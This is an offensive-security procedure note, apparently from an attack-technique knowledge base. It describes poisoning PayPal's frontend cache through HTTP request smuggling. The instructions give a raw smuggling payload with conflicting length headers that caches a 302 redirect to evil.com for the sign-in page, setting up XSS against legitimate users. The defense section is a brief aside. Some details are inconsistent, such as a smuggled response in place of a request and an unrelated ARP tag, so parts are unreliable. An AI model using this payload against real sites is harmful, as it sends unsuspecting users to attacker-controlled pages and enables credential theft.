---
tags:
  - cache-poisoning
  - web-exploitation
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
id: 2af7fd80-a8da-41b6-9f0a-749ee29d8229
created_at: '2025-12-11T03:47:56.912Z'
updated_at: '2025-12-11T03:47:56.912Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1190]]'
---
# Poison Cache with Redirect

## Summary

This procedure uses a smuggled request to inject a redirect into the cache, causing legitimate users to be served attacker-controlled content.

## Description

Building on request smuggling, this injects a 302 redirect into the cache of PayPal's frontend servers. The poisoned cache affects page integrity, enabling XSS without backend changes. Targets web caching layers; outcome is persistent redirect in cache.

## Requirements

1. Confirmed smuggling vulnerability
2. Attacker-controlled domain for redirect target
3. Proxy tool for precise request crafting

## Defense

Defensive measures and detection strategies:

- Implement cache key normalization
- Monitor cache poisoning attempts via anomaly detection

## Objectives

1. Inject redirect response into cache
2. Ensure cache serves poisoned content
3. Set stage for XSS exploitation

## Instructions

### Step 1: Prepare Poisoned Request

**Context**: Craft a smuggled response that mimics a redirect.

Use [[tools/Burp-Suite]] to build the request.

> Ensure headers conflict to trigger smuggling.

### Step 2: Send Poisoned Redirect

**Context**: Transmit the request to poison the cache.

Execute [[commands/send-poisoned-redirect]]:

```http
POST /signin HTTP/1.1
Host: paypal.com
Content-Length: 5
Transfer-Encoding: chunked

0

HTTP/1.1 302 Found
Location: https://evil.com/xss
```

> This caches the redirect for /signin.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques

## Commands Used

- [[commands/send-poisoned-redirect]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[ARP Cache Poisoning]]
- #redirect-injection
